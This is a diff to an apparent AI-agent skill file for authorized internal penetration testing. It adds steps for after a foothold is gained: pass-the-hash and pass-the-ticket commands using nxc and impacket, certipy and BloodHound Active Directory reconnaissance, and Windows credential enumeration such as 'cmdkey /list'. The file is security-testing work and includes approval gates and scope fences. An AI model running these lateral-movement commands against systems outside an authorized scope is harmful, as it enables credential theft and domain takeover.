@@ -30,3 +30,11 @@ Use this skill for MLPS checks `AD-DIR` and `WIN-SVC` during authorized internal
   - When conducting authorized domain password spraying, use `run_password_spray(task_id=..., target=..., protocol="smb"|"ldap"|"winrm", user_list=..., pass_list=..., start_offset=0, max_passwords=1, delay_seconds=2)` instead of `hydra` or raw `nxc` with plaintext password files. It enforces the electronic fence, `lateral_gate`, inter-round lockout delay, and password masking.
 - If `lateral_gate` is enabled, wait for foothold approval (`POST /api/tasks/{id}/lateral/approve`) before running directory graph collection (`bloodhound-python`), ADCS auditing (`certipy`), DNS enumeration (`adidnsdump`), or credentialed `nxc` / `impacket-*` tools.
 - Record all verified outcomes (including `"passed"` and `"na"` for Linux-only environments) via `record_check_result(check_code="AD-DIR", ...)`.
+
+## 4. Post-Foothold Relay, Ticket/Hash Reuse & Windows Host Enum (After Lateral Approval)
+- **Credential & Hash / Ticket Relay**:
+  - Save discovered domain/local credentials and NTLM hashes in `task_credentials`.
+  - Use NTLM Pass-the-Hash (`nxc smb <target> -u <user> -H <lm:nt> --shares`, `impacket-wmiexec -hashes :<nt> <domain>/<user>@<target>`) or Kerberos ccache Pass-the-Ticket (`KRB5CCNAME=/path/to/ticket.ccache impacket-smbexec -k -no-pass <domain>/<user>@<target>`) strictly within electronic fence.
+  - Run ADCS template auditing (`certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable`) and BloodHound collection (`bloodhound-python -c all -d <domain> -u <user> -p <pass> -ns <dc>`).
+- **Authorized Windows Foothold Non-Destructive Enum**:
+  - When holding an interactive Windows shell (`depth_session_open` / WinRM / SSH), verify privilege & domain posture without deploying persistent agents: `whoami /priv`, `systeminfo`, `cmdkey /list`, `net user /domain`, `sc query`, and `schtasks /query /fo LIST` (scoped to unquoted/writable service paths).
